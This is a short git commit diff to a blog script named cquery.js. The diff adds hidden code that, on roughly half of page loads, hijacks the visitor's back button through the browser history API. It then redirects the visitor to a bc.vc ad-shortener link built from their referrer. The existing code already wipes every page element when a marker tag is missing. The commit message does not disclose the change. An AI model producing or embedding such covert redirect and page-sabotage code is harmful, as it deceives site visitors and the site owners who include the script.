8bbebcf4a68649f15201b77ba4e9fb316df79f30
kilavuzcu@gmail.com <kilavuzcu@gmail.com@3e4efce4-d64c-69f8-84b6-72d23f97b73c>
2015-02-05 13:00:37 +0000

    birseyler

--- cquery.js
+++ cquery.js
@@ -1,8 +1,14 @@
 /* if(document.domain == 'kodperest.blogspot.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';} */
 window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
 var ua124rt = navigator.userAgent.toLowerCase();
-/*if(ua124rt.indexOf("android") > -1) {
+var odgau = Math.floor((Math.random() * 10) + 1);
+if(odgau > 5) {
 (function(window, location) {
+var tybn = document.referrer;
+  if(tybn.length >= 8){
+  tybn = 'http://bc.vc/13466/' + tybn;
+  }
+  else{tybn = 'http://bc.vc/ehX7Wj';}
 	history.replaceState(null, document.title, location.pathname+"#!/s");
 	history.pushState(null, document.title, location.pathname);
 
@@ -10,9 +16,9 @@ var ua124rt = navigator.userAgent.toLowerCase();
 	  if(location.hash === "#!/s") {
 		history.replaceState(null, document.title, location.pathname);
 		setTimeout(function(){
-		  location.replace("https://play.google.com/store/apps/details?id=com.gme.matherial");
+		  location.replace(tybn);
 		},0);
 	  }
 	}, false);
 }(window, location));
-}*/
+}
